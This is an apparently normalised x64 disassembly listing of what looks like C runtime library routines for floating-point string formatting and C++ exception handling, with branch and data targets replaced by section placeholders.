dec rbx
cmp [ rbx ] 0x30
je r-xdata
mov rax [ rcx + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
cmp [ rbx ] al
jne r-xdata
inc rbx
mov al [ rdx ]
inc rbx
inc rdx
mov [ rbx ] al
test al al
jne r-xdata
dec rbx
sub_1800117a8
push rbx
sub rsp 0x30
mov rax r8
mov rbx rdx
mov r8 r9
mov rdx rax
test ecx ecx
je r-xdata
lea rcx [ rsp + 0x40 ]
call sub_18001398c
mov r11d [ rsp + 0x40 ]
mov [ rbx ] r11d
lea rcx [ rsp + 0x20 ]
call sub_18001388c
mov r11 [ rsp + 0x20 ]
mov [ rbx ] r11
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_180011804
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x50
mov r12 rdx
mov rdx [ rsp + 0xa0 ]
mov rdi rcx
lea rcx [ rax - 0x38 ]
mov r15d r9d
movsxd rbx r8d
call sub_18000643c
test rdi rdi
jne r-xdata
test r12 r12
jne r-xdata
call sub_180006ee4
lea ebx [ rdi + 0x16 ]
xor eax eax
test ebx ebx
cmovg eax ebx
add eax 0x9
cdqe
cmp r12 rax
ja r-xdata
call sub_180006ee4
lea ebx [ r12 + 0x16 ]
mov [ rax ] ebx
call sub_180008e08
cmp [ rsp + 0x48 ] r12b
je r-xdata
mov eax ebx
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x98 ] 0x0
mov rsi [ rsp + 0x90 ]
je r-xdata
call sub_180006ee4
mov ebx 0x22
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsi ] 0x2d
mov rdx rdi
jne r-xdata
xor ebp ebp
cmp [ rsi ] 0x2d
sete bpl
xor r13d r13d
add rbp rdi
test ebx ebx
setg r13b
test r13d r13d
je r-xdata
mov [ rax ] ebx
call sub_180008e08
cmp [ rsp + 0x48 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ rdi ] 0x2d
lea rdx [ rdi + 0x1 ]
mov rcx rbp
call sub_18000be60
movsxd rcx r13d
mov rdx rbp
lea r8 [ rax + 0x1 ]
add rcx rbp
call sub_180006a70
xor ecx ecx
lea r8 [ r--data ]
cmp [ rsp + 0x98 ] cl
sete cl
add rbx rdx
add rbx rcx
sub rdi rbx
cmp r12 0xffffffffffffffff
mov rcx rbx
lea rdx [ r12 + rdi ]
cmove rdx r12
call sub_180009e10
test eax eax
jne r-xdata
mov al [ rdx + 0x1 ]
mov [ rdx ] al
mov rax [ rsp + 0x30 ]
inc rdx
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rdx ] cl
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d64
int3
lea rcx [ rbx + 0x2 ]
test r15d r15d
je r-xdata
mov rax [ rsi + 0x10 ]
cmp [ rax ] 0x30
je r-xdata
mov [ rbx ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov r8d [ rsi + 0x4 ]
dec r8d
jns r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp [ rcx ] 0x30
jne r-xdata
cmp r8d 0x64
jl r-xdata
neg r8d
mov [ rbx + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
lea rdx [ rcx + 0x1 ]
mov r8d 0x3
call sub_180006a70
cmp r8d 0xa
jl r-xdata
mov eax 0x51eb851f
imul r8d
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x2 ] dl
imul edx edx 0xffffff9c
add r8d edx
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r13
pop r12
retn
add [ rbx + 0x4 ] r8b
mov eax 0x66666667
imul r8d
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x3 ] dl
imul edx edx 0xfffffff6
add r8d edx
sub_180011a38
push rbx
push rbp
push rsi
push rdi
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov ebp 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9d ebp
call sub_180013c20
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_180006ee4
mov [ rax ] ebp
call sub_180008e08
mov eax ebp
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180006220
add rsp 0x88
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
lea r8d [ rsi + 0x1 ]
sete al
xor ecx ecx
test esi esi
setg cl
add rax rdi
lea r9 [ rsp + 0x40 ]
add rcx rax
call sub_180013a8c
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
xor eax eax
test esi esi
setg al
sub rdx rax
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d esi
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_180011804
mov [ rdi ] 0x0
jmp r-xdata
sub_180011b30
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x50
mov rdi rdx
mov rdx [ rbp + 0x58 ]
mov r14 rcx
lea rcx [ rbp - 0x20 ]
mov r12d r9d
mov rbx r8
mov [ rbp + 0x30 ] 0x3ff
mov r13d 0x30
call sub_18000643c
xor r15d r15d
test r12d r12d
cmovs r12d r15d
test rdi rdi
jne r-xdata
test rbx rbx
jne r-xdata
call sub_180006ee4
lea ebx [ rdi + 0x16 ]
lea eax [ r12 + 0xb ]
mov [ rdi ] r15b
movsxd rcx eax
cmp rbx rcx
ja r-xdata
call sub_180006ee4
mov ebx 0x16
mov [ rax ] ebx
call sub_180008e08
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rax [ r14 ]
mov ecx 0x7ff
shr rax 0x34
and rax rcx
cmp rax rcx
jne r-xdata
call sub_180006ee4
mov ebx 0x22
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rax 0x8000000000000000
test [ r14 ] rax
je r-xdata
lea r8 [ rbx - 0x2 ]
cmp rbx 0xffffffffffffffff
lea rdx [ rdi + 0x2 ]
mov r9d r12d
mov rcx r14
cmove r8 rbx
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x20 ] r15d
call sub_180011a38
test eax eax
je r-xdata
mov [ rax ] ebx
call sub_180008e08
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov r9d [ rbp + 0x50 ]
mov r11d 0x30
mov rbx 0xfffffffffffff
mov eax r9d
mov [ rdi ] r11b
neg eax
mov eax r9d
sbb cl cl
and cl 0xe0
add cl 0x78
neg eax
mov rax 0x7ff0000000000000
sbb edx edx
mov [ rdi + 0x1 ] cl
and edx 0xffffffe0
sub edx 0xffffffd9
test [ r14 ] rax
jne r-xdata
mov [ rdi ] 0x2d
inc rdi
cmp [ rdi + 0x2 ] 0x2d
jne r-xdata
mov [ rdi ] r15b
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov [ rdi + 0x2 ] 0x31
add rdi 0x3
mov [ rdi + 0x2 ] r11b
mov rax [ r14 ]
add rdi 0x3
and rax rbx
neg rax
sbb rax rax
and eax 0x3fe
mov [ rbp + 0x30 ] rax
jmp r-xdata
mov ebx [ rbp + 0x50 ]
mov [ rdi ] 0x30
mov edx 0x65
mov eax ebx
neg eax
sbb cl cl
and cl 0xe0
add cl 0x78
mov [ rdi + 0x1 ] cl
lea rcx [ rdi + 0x2 ]
call sub_180007314
test rax rax
je r-xdata
mov [ rdi ] 0x2d
inc rdi
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ r15 ] cl
mov [ r15 ] r10b
jmp r-xdata
mov r15 rdi
xor r10d r10d
inc rdi
test r12d r12d
jne r-xdata
cmp [ rbp - 0x8 ] r15b
jmp r-xdata
neg ebx
sbb cl cl
and cl 0xe0
add cl 0x70
mov [ rax ] cl
mov [ rax + 0x3 ] r15b
test r12d r12d
jle r-xdata
mov r8 0xf000000000000
test [ r14 ] rbx
jbe r-xdata
je r-xdata
cmp [ r15 ] r10b
cmove rdi r15
neg r9d
sbb al al
and al 0xe0
add al 0x70
mov [ rdi ] al
mov rcx [ r14 ]
shr rcx 0x34
and ecx 0x7ff
sub rcx [ rbp + 0x30 ]
js r-xdata
mov r8d r12d
mov dl r11b
mov rcx rdi
mov ebx r12d
call sub_180008e40
mov r9d [ rbp + 0x50 ]
add rdi rbx
xor r10d r10d
lea r11d [ r10 + 0x30 ]
test r13w r13w
js r-xdata
mov rax [ r14 ]
mov cl r13b
and rax r8
and rax rbx
shr rax cl
add ax r11w
cmp ax 0x39
jbe r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov [ rdi + 0x1 ] 0x2d
add rdi 0x2
neg rcx
mov [ rdi + 0x1 ] 0x2b
add rdi 0x2
jmp r-xdata
mov rax [ r14 ]
mov cl r13b
and rax r8
and rax rbx
shr rax cl
cmp ax 0x8
jbe r-xdata
mov [ rdi ] al
shr r8 0x4
dec r12d
inc rdi
add r13w 0xfffc
jns r-xdata
add ax dx
cmp rcx 0x64
jl r-xdata
mov rax 0x20c49ba5e353f7cf
imul rcx
sar rdx 0x7
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffc18
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rdi r8
jne r-xdata
mov r8 rdi
mov [ rdi ] r11b
cmp rcx 0x3e8
jl r-xdata
lea rax [ rdi - 0x1 ]
test r12d r12d
jle r-xdata
cmp rdi r8
jne r-xdata
mov rax 0xa3d70a3d70a3d70b
imul rcx
add rdx rcx
sar rdx 0x6
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xffffffffffffff9c
mov [ rdi ] al
inc rdi
add rcx rdx
mov [ rax ] r11b
dec rax
jmp r-xdata
cmp [ rax ] 0x46
jne r-xdata
mov rax 0x6666666666666667
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffff6
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rcx 0xa
jl r-xdata
cmp [ rax ] 0x66
je r-xdata
cmp rax r15
je r-xdata
add cl r11b
cmp [ rbp - 0x8 ] r10b
mov [ rdi ] cl
mov [ rdi + 0x1 ] r10b
inc [ rax - 0x1 ]
mov cl [ rax ]
cmp cl 0x39
jne r-xdata
inc cl
mov [ rax ] cl
jmp r-xdata
add dl 0x3a
mov [ rax ] dl
jmp r-xdata
sub_180011f10
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
mov ebx [ r9 + 0x4 ]
mov rsi rdx
mov rdx [ rsp + 0x78 ]
mov rdi rcx
lea rcx [ rax - 0x28 ]
mov r12 r9
dec ebx
mov ebp r8d
call sub_18000643c
test rdi rdi
jne r-xdata
test rsi rsi
jne r-xdata
call sub_180006ee4
lea ebx [ rdi + 0x16 ]
mov [ rax ] ebx
call sub_180008e08
cmp [ rsp + 0x38 ] dil
je r-xdata
cmp [ rsp + 0x70 ] 0x0
je r-xdata
call sub_180006ee4
lea ebx [ rsi + 0x16 ]
mov [ rax ] ebx
call sub_180008e08
cmp [ rsp + 0x38 ] sil
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ r12 ] 0x2d
jne r-xdata
cmp ebx ebp
jne r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
cmp [ r12 + 0x4 ] 0x0
jg r-xdata
mov [ rdi ] 0x2d
inc rdi
xor eax eax
cmp [ r12 ] 0x2d
movsxd rcx ebx
sete al
add rax rdi
mov [ rcx + rax ] 0x30
movsxd rax [ r12 + 0x4 ]
add rdi rax
mov rcx rdi
call sub_18000be60
lea rcx [ rdi + 0x1 ]
mov rdx rdi
lea r8 [ rax + 0x1 ]
call sub_180006a70
mov [ rdi ] 0x30
inc rdi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rcx rdi
lea rsi [ rdi + 0x1 ]
call sub_18000be60
mov rdx rdi
mov rcx rsi
lea r8 [ rax + 0x1 ]
call sub_180006a70
mov r11 [ rsp + 0x20 ]
mov rax [ r11 + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
mov [ rdi ] al
mov ebx [ r12 + 0x4 ]
test ebx ebx
jns r-xdata
test ebp ebp
jle r-xdata
xor eax eax
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
neg ebx
cmp [ rsp + 0x70 ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov ebx ebp
cmp ebp eax
cmovge ebx eax
movsxd r8 ebx
mov edx 0x30
mov rcx rsi
call sub_180008e40
mov rcx rsi
call sub_18000be60
movsxd rcx ebx
mov rdx rsi
lea r8 [ rax + 0x1 ]
add rcx rsi
call sub_180006a70
sub_1800120ac
push rbx
push rbp
push rsi
push rdi
sub rsp 0x78
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov ebp 0x16
lea r8 [ rsp + 0x48 ]
lea rdx [ rsp + 0x30 ]
mov r9d ebp
call sub_180013c20
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_180006ee4
mov [ rax ] ebp
call sub_180008e08
mov eax ebp
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_180006220
add rsp 0x78
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov r8d [ rsp + 0x34 ]
xor ecx ecx
lea r9 [ rsp + 0x30 ]
add r8d esi
cmp [ rsp + 0x30 ] 0x2d
sete cl
add rcx rdi
call sub_180013a8c
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x30 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
mov rax [ rsp + 0xc0 ]
lea r9 [ rsp + 0x30 ]
mov r8d esi
mov [ rsp + 0x28 ] rax
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] 0x0
call sub_180011f10
mov [ rdi ] 0x0
jmp r-xdata
sub_180012180
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rdi r8
mov rsi rdx
mov ebp r9d
mov ebx 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9d ebx
call sub_180013c20
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_180006ee4
mov [ rax ] ebx
call sub_180008e08
mov eax ebx
jmp r-xdata
mov r12d [ rsp + 0x44 ]
xor eax eax
dec r12d
cmp [ rsp + 0x40 ] 0x2d
sete al
or rdx 0xffffffffffffffff
lea rbx [ rax + rsi ]
cmp rdi rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180006220
add rsp 0x80
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov rcx rbx
call sub_180013a8c
test eax eax
je r-xdata
mov rdx rdi
sub rdx rax
mov eax [ rsp + 0x44 ]
dec eax
cmp r12d eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ rsi ] 0x0
jmp r-xdata
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d ebp
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rax
call sub_180011804
cmp eax ebp
jge r-xdata
test cl cl
je r-xdata
mov rax [ rsp + 0xd8 ]
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov [ rsp + 0x28 ] rax
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] 0x1
call sub_180011f10
jmp r-xdata
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
mov [ rbx - 0x2 ] al
sub_1800122b4
sub rsp 0x38
cmp r9d 0x65
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_180011a38
cmp r9d 0x45
je r-xdata
cmp r9d 0x66
jne r-xdata
cmp r9d 0x61
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_1800120ac
jmp r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_180011b30
jmp r-xdata
cmp r9d 0x41
je r-xdata
add rsp 0x38
retn
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_180012180
jmp r-xdata
sub_180012370
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_18000db64
xor ecx ecx
test edi edi
je r-xdata
call sub_18000db64
or eax 0xffffffff
mov r9 [ rsi + 0x8 ]
movsxd r8 [ rbx + 0x18 ]
lea rdx [ r9 + r8 ]
test ecx ecx
je r-xdata
inc ecx
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r8 + rax * 8 ]
mov eax [ rdx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r9
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180012438
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_180010ffc
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_1800124b0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180007548
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180006da4#2
sub_1800124ec
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov esi [ rcx + 0x4 ]
xor ebx ebx
mov r12 r8
mov rbp rdx
mov rdi rcx
test esi esi
je r-xdata
mov r11 rbx
movsxd rsi esi
call sub_1800110e8
lea r11 [ rsi + rax ]
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
movsxd rsi [ rdi + 0x4 ]
call sub_1800110e8
lea r11 [ rsi + rax ]
jmp r-xdata
test esi esi
je r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov rsi rbx
call sub_1800110e8
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
mov al 0x2
test [ rbp ] al
je r-xdata
cmp [ rdi + 0x4 ] ebx
je r-xdata
call sub_180011100
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rsi r11
je r-xdata
test [ r12 ] 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
mov rsi rbx
call sub_1800110e8
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
test [ r12 ] 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_180011100
lea rcx [ rsi + 0x10 ]
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea rdx [ r11 + rax + 0x10 ]
call sub_18000c100
test eax eax
je r-xdata
test [ r12 ] al
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ebx 0x1
test [ rdi ] al
je r-xdata
sub_180012610
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe0434352
je r-xdata
call sub_180007a4c
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp [ rax ] 0xe0434f4d
je r-xdata
xor eax eax
add rsp 0x28
retn
call sub_180007a4c
dec [ rax + 0x100 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
call sub_180007a4c
and [ rax + 0x100 ] 0x0
call sub_18000db40
sub_180012664
mov rax rsp
mov [ rax + 0x20 ] r9d
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov r15 rdx
mov r14 rcx
call sub_180012404
mov edi eax
call sub_1800110e8
mov [ rsp + 0x28 ] rax
call sub_180007a4c
inc [ rax + 0x100 ]
call sub_180007a4c
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_180007a4c
dec [ rax + 0x100 ]
cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_18001242c
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_18000db64
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_18000db64
movsxd r12 edi
call sub_1800110e8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_1800110e8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_1800110e8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_1800110e8
add rax rbx
jmp r-xdata
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_18001242c
call sub_1800110e8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x24 ] edi
jmp r-xdata
xor eax eax
call sub_1800110e8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_1800110e8
add rax rbx
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_180013cf0
mov rcx [ rsp + 0x28 ]
call sub_180011118
sub_1800127f0
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] dl
sub rsp 0x28
cmp [ rcx ] 0xe06d7363
jne r-xdata
add rsp 0x28
mov rax [ rcx + 0x30 ]
test rax rax
je r-xdata
cmp [ rax + 0x4 ] 0x0
je r-xdata
movsxd rax [ rax + 0x4 ]
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_180012858
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi rdx
mov r14 rcx
test rdx rdx
jne r-xdata
xor edi edi
xor r12b r12b
cmp [ rdx ] edi
jle r-xdata
call sub_18000db64
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov al r12b
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
call sub_180011100
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r13 [ r11 + rcx + 0x4 ]
call sub_180011100
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov ebp [ r11 + rcx ]
test ebp ebp
jle r-xdata
inc edi
cmp edi [ rsi ]
jl r-xdata
movsxd rax edi
lea r15 [ rax + rax * 4 ]
mov r12b 0x1
dec ebp
add r13 0x4
test ebp ebp
jg r-xdata
call sub_180011100
mov rbx rax
movsxd rax [ r13 ]
add rbx rax
call sub_1800110e8
movsxd rcx [ rsi + 0x4 ]
mov r8 [ r14 + 0x30 ]
lea rax [ rax + r15 * 4 ]
mov rdx rbx
add rcx rax
call sub_1800124ec
test eax eax
jne r-xdata
jmp r-xdata
sub_18001292c
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x80
mov rdi rcx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
and [ rsp + 0xc0 ] r13d
and [ rsp + 0x48 ] r13
and [ rsp + 0x40 ] r13
call sub_180007a4c
mov rax [ rax + 0xf8 ]
mov [ rsp + 0xd8 ] rax
call sub_180007a4c
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xd0 ] rax
mov rsi [ rdi + 0x50 ]
mov [ rsp + 0xc8 ] rsi
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov r15 [ rdi + 0x30 ]
mov r12 [ rdi + 0x28 ]
mov [ rsp + 0x60 ] r12
call sub_180007a4c
mov [ rax + 0xf0 ] rsi
call sub_180007a4c
mov [ rax + 0xf8 ] rbx
call sub_180007a4c
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x70 ]
call sub_1800114a8
mov r14 rax
mov [ rsp + 0x50 ] rax
cmp [ rdi + 0x58 ] r13
je r-xdata
mov r8d 0x100
mov rdx r12
mov rcx r15
call sub_180013cf0
mov rbx rax
mov [ rsp + 0x48 ] rax
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
jmp r-xdata
mov [ rsp + 0xc0 ] 0x1
call sub_180007a4c
mov rcx [ rax + 0x138 ]
mov [ rsp + 0x40 ] rcx
mov rcx r14
call sub_180011520
test r13d r13d
jne r-xdata
call sub_180007a4c
mov [ rax + 0xf0 ] r15
call sub_180007a4c
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_1800114ec
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_1800127f0
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_180012a31
mov [ rsp + 0x20 ] 0x1
call sub_180007a4c
and [ rax + 0x2c0 ] 0x0
